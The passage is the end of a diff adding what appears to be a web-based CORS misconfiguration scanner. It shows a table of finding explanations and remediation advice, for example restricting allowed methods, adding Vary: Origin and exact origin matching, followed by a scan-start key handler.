+    exposehdr:{text:'Expose-Headers: * leaks all response headers.',code:'Only expose specific needed headers.'},
+    maxage:{text:'Excessive max-age caches preflight too long — changes cannot propagate.',code:'Access-Control-Max-Age: 600 (10 min max recommended)'},
+    corssafelst:{text:'Server allows arbitrary headers due to wildcard parsing.',code:'Strictly validate requested headers against allowlist.'},
+    put:{text:'Remove PUT from CORS allowed methods.',code:'Access-Control-Allow-Methods: GET, POST'},
+    delete:{text:'Remove DELETE from CORS allowed methods.',code:'Access-Control-Allow-Methods: GET, POST'},
+    patch:{text:'Remove PATCH from CORS allowed methods.',code:'Access-Control-Allow-Methods: GET, POST'},
+    allmethods:{text:'Wildcard methods allow all HTTP verbs cross-origin.',code:'Explicitly list only GET, POST.'},
+    postread:{text:'POST response readable cross-origin — data theft via form submission.',code:'Require CSRF token for state-changing operations.'},
+    varymissing:{text:'Missing Vary: Origin enables CDN/proxy cache poisoning.',code:'Always include: Vary: Origin'},
+    casesens:{text:'Case-insensitive origin matching is a bypass.',code:'Use case-sensitive exact match.'},
+    portbypass:{text:'Port number in origin bypasses exact match.',code:'Include port-specific origins in allowlist.'},
+    port80:{text:'Explicit port numbers bypassing string match.',code:'Parse URL instead of simple string match.'},
+    cred:{text:'Never allow credentials with wildcard or reflected origins.',code:'ACAO: https://your-app.com\nACAC: true (must be exact, never wildcard)'},
+    ipv4:{text:'IP-based origins should not be accepted.',code:'Only allow domain-based https:// origins.'},
+    ipv6:{text:'IPv6 origins bypass basic regex checks.',code:'Restrict origins to valid registered domains.'},
+    localhost:{text:'Localhost origin allowed — local network attack vector.',code:'Remove localhost from allowed origins in production.'},
+    intranet:{text:'Intranet IP allowed - SSRF escalation risk.',code:'Block internal IP ranges in input validation.'},
+    multiorigin:{text:'Multiple origins in header — non-standard, parser confusion.',code:'Return exactly one origin or reject.'},
+    subxss:{text:'Trusted subdomain + XSS = full CORS bypass chain.',code:'Audit all subdomains for XSS. Use CSP.'},
+    redirect:{text:'Redirect preserves origin — check origin on auth endpoint.',code:'Re-validate origin after 301/302 redirects.'},
+  };
+  return m[id]||{text:'Restrict ACAO to trusted origins only.',code:'ACAO: https://your-app.com'};
+}
+
+document.getElementById('urlInput').addEventListener('keydown',e=>{if(e.key==='Enter')startScan()});
+</script>
+</body>
+</html>
+
